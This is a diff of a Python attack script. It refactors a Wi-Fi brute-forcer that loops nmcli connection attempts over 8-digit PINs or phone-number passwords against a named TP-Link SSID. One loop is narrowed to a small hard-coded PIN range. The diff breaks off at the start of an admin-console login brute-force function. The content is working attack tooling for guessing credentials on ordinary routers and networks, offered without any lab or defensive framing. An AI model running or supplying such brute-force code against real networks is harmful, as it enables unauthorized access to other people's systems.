@@ -5,57 +5,51 @@ import base64
 import urllib.parse
 import requests
 
-def attempt_to_authenticate(ssid: str, pin: str):
+#Attack 1 - SSID PIN Brute Force
+def ssid_authentication(ssid: str, pin: str) -> bool:
+    subprocess.run(["nmcli", "connection", "delete", ssid],stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+
     try:
-        cmd = ["nmcli", "device", "wifi", "connect", ssid, "password", pin]
-        
-        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=10)
-        
-        if result.returncode != 0:
-            print(f"Connection command failed: {result.stderr.strip()}")
-            return False
-            
+        cmd = ["nmcli", "--wait", "4", "device", "wifi", "connect", ssid, "password", pin]
+        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+
+        if "successfully activated" in result.stdout.lower():
+            print(f"Connected to {ssid} with PIN: {pin}")
+            return True
+
     except subprocess.TimeoutExpired:
-        print("Connection timed out at the OS level.")
+        subprocess.run(["nmcli", "connection", "delete", ssid],stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         return False
     except Exception as e:
-        print(f"An unexpected error occurred: {e}")
+        print(f"Error: {e}")
         return False
 
-    start_time = time.time()
-    while time.time() - start_time < 4:
-        try:
-            current_ssid = subprocess.check_output(["iwgetid", "-r"], text=True).strip()
-            
-            if current_ssid == ssid:
-                print(f"Successfully connected to {ssid} with pin: {pin}!")
-                return True
-        except subprocess.CalledProcessError:
-            pass
-        time.sleep(1)
-
-    print(f"Failed to connect to {ssid} using {pin} within 4 seconds. Moving on...")
+    subprocess.run(["nmcli", "connection", "delete", ssid],stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    print(f"Failed to connect to {ssid} within the timeout. Moving on...")
     return False
 
-def ssid_brute(ssid: str):
+
+def ssid_brute(ssid: str)->None:
     print("\n" + "═" * 83)
     print("1 — TP-LINK SSID Brute Force   | 2 - Phone Number Brute Force ")
     print("═" * 83 + "\n")
 
     choice = input("Select an option: ").strip()
     if choice == "1":
-        for i in range(99999999):
+        for i in range(52445720, 52445730):
             pin = f"{i:08d}"
-            attempt_to_authenticate(ssid, str(pin))
+            if ssid_authentication(ssid, pin):
+                print(f"Found PIN: {pin}")
+                break
     elif choice == "2":
         area_code = input("What is the area code?: ").strip()
         for num in range(10000000):
             rest = f"{num:07d}"
-            attempt_to_authenticate(ssid, f"{area_code}{rest}")   
+            ssid_authentication(ssid, f"{area_code}{rest}")   
     else:
         print("Invalid option")
 
-#Attack 3
+#Attack 3 Admin Console Brute Force
 def attempt_admin_login(target_url: str , token: str)-> bool:
     session_cookie = {"Authorization": token}
     headers = {
